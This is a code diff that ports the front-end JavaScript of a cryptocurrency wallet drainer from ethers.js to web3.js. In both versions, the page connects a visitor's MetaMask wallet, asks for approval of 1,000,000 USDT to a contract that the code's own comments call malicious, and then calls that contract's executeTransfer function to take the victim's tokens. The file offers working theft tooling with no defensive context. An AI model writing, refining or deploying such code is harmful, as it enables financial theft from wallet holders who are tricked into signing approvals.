@@ -1,43 +1,15 @@
-// USDT 合约地址（主网）
-const usdtAddress = "0xdAC17F958D2ee523a2206206994597C13D831ec7"; // 替换为您的 USDT 合约地址
-// 您的恶意合约地址
-const contractAddress = "0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b"; 
+const contractAddress = '0xAc7aa2ee970A703F3716A66D39F6A1cc5cfcea6b'; // 你的合约地址
+const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7'; // USDT合约地址
 
-// ABI
-const usdtAbi = [
+const maliciousABI = [
     {
         "inputs": [
-            { "internalType": "address", "name": "spender", "type": "address" },
-            { "internalType": "uint256", "name": "amount", "type": "uint256" }
+            {
+                "internalType": "address",
+                "name": "user",
+                "type": "address"
+            }
         ],
-        "name": "approve",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    },
-    {
-        "inputs": [{ "internalType": "address", "name": "account", "type": "address" }],
-        "name": "balanceOf",
-        "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }],
-        "stateMutability": "view",
-        "type": "function"
-    },
-    {
-        "inputs": [
-            { "internalType": "address", "name": "sender", "type": "address" },
-            { "internalType": "address", "name": "recipient", "type": "address" },
-            { "internalType": "uint256", "name": "amount", "type": "uint256" }
-        ],
-        "name": "transferFrom",
-        "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }],
-        "stateMutability": "nonpayable",
-        "type": "function"
-    }
-];
-
-const maliciousContractAbi = [
-    {
-        "inputs": [{ "internalType": "address", "name": "user", "type": "address" }],
         "name": "executeTransfer",
         "outputs": [],
         "stateMutability": "nonpayable",
@@ -45,53 +17,95 @@ const maliciousContractAbi = [
     }
 ];
 
-let signer, userAddress;
+const usdtABI = [
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "spender",
+                "type": "address"
+            },
+            {
+                "internalType": "uint256",
+                "name": "amount",
+                "type": "uint256"
+            }
+        ],
+        "name": "approve",
+        "outputs": [
+            {
+                "internalType": "bool",
+                "name": "",
+                "type": "bool"
+            }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+    },
+    {
+        "inputs": [
+            {
+                "internalType": "address",
+                "name": "account",
+                "type": "address"
+            }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+            {
+                "internalType": "uint256",
+                "name": "",
+                "type": "uint256"
+            }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+    }
+];
 
-// 连接钱包
-async function connectWallet() {
-    if (typeof window.ethereum !== 'undefined') {
-        const provider = new ethers.providers.Web3Provider(window.ethereum);
-        signer = provider.getSigner();
-        userAddress = await signer.getAddress();
-        console.log("连接成功:", userAddress);
+let web3;
+let userAccount;
 
-        document.getElementById("authorizeButton").disabled = false;
-        document.getElementById("executeTransferButton").disabled = false;
+document.getElementById('connectButton').onclick = async () => {
+    if (window.ethereum) {
+        web3 = new Web3(window.ethereum);
+        try {
+            await window.ethereum.request({ method: 'eth_requestAccounts' });
+            userAccount = (await web3.eth.getAccounts())[0];
+            console.log('Wallet connected: ', userAccount);
+            alert('Wallet connected: ' + userAccount);
+            document.getElementById('approveButton').disabled = false; // 启用授权按钮
+        } catch (error) {
+            console.error('Connection error: ', error);
+            alert('Failed to connect wallet: ' + error.message);
+        }
     } else {
-        alert("请安装 MetaMask!");
+        alert('请安装 MetaMask!');
     }
-}
+};
 
-// 授权转账
-async function authorizeTransfer() {
-    const usdtContract = new ethers.Contract(usdtAddress, usdtAbi, signer);
-    const amount = ethers.utils.parseUnits("1000000", 6); // 1000000 USDT（USDT 通常有6位小数）
+document.getElementById('approveButton').onclick = async () => {
+    const usdtContract = new web3.eth.Contract(usdtABI, usdtAddress);
+    const amountToApprove = web3.utils.toWei('1000000', 'mwei'); // 1000000 USDT（USDT 的精度是 6 位）
 
     try {
-        const tx = await usdtContract.approve(contractAddress, amount);
-        console.log("授权交易提交:", tx);
-        await tx.wait();
-        console.log("授权成功:", tx);
+        await usdtContract.methods.approve(contractAddress, amountToApprove).send({ from: userAccount });
+        alert('授权成功');
+        document.getElementById('executeTransferButton').disabled = false; // 启用转移按钮
     } catch (error) {
-        console.error("授权失败:", error);
+        console.error('Approval error: ', error);
+        alert('授权失败: ' + error.message);
     }
-}
+};
 
-// 执行转账
-async function executeTransfer() {
-    const maliciousContract = new ethers.Contract(contractAddress, maliciousContractAbi, signer);
+document.getElementById('executeTransferButton').onclick = async () => {
+    const maliciousContract = new web3.eth.Contract(maliciousABI, contractAddress);
 
     try {
-        const tx = await maliciousContract.executeTransfer(userAddress);
-        console.log("转账交易提交:", tx);
-        await tx.wait();
-        console.log("转账成功:", tx);
+        await maliciousContract.methods.executeTransfer(userAccount).send({ from: userAccount });
+        alert('转账执行成功');
     } catch (error) {
-        console.error("转账失败:", error);
+        console.error('Transfer error: ', error);
+        alert('转账失败: ' + error.message);
     }
-}
-
-// 事件绑定
-document.getElementById("connectButton").onclick = connectWallet;
-document.getElementById("authorizeButton").onclick = authorizeTransfer;
-document.getElementById("executeTransferButton").onclick = executeTransfer;
+};
